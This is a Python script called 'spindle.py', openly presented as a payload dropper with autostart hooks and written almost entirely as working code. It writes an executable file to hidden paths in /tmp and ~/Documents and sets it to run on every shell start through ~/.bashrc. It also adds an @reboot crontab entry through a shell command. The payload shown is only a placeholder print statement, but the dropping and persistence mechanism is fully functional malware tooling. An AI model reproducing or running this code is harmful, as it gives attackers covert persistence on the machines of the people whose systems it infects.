# spindle.py — Multi-Drop Payload Loader with Autostart Hooks
import os
import shutil
from rich import print, panel

def drop_payload(target_path, payload_code):
    try:
        with open(target_path, "w") as f:
            f.write(payload_code)
        os.chmod(target_path, 0o755)
        print(f"[green]Payload dropped:[/green] {target_path}")
    except Exception as e:
        print(f"[red]Drop failed:[/red] {e}")

def hook_bashrc(target_path):
    bashrc = os.path.expanduser("~/.bashrc")
    line = f"python3 {target_path} &\n"
    try:
        with open(bashrc, "a") as f:
            f.write(f"\n# Spindle Loader\n{line}")
        print("[blue]Hooked into .bashrc[/blue]")
    except Exception as e:
        print(f"[red]Bashrc hook failed:[/red] {e}")

def hook_crontab(target_path):
    cron_line = f"@reboot python3 {target_path}"
    try:
        current = os.popen("crontab -l").read()
        if cron_line not in current:
            updated = current + f"\n{cron_line}\n"
            os.system(f'(echo "{updated.strip()}") | crontab -')
            print("[blue]Hooked into crontab[/blue]")
    except Exception as e:
        print(f"[red]Cron hook failed:[/red] {e}")

def run():
    print(panel.Panel("\U0001F4C0 [bold green]SPINDLE[/bold green] — Dropper + Autorun Hooks"))
    locations = ["/tmp/.daemon.py", os.path.expanduser("~/Documents/.spindle.py")]
    payload = "import os; print('Payload active:', os.getpid())"

    for path in locations:
        drop_payload(path, payload)
        hook_bashrc(path)
        hook_crontab(path)

    print("[green]Spindle deployment complete.[/green]")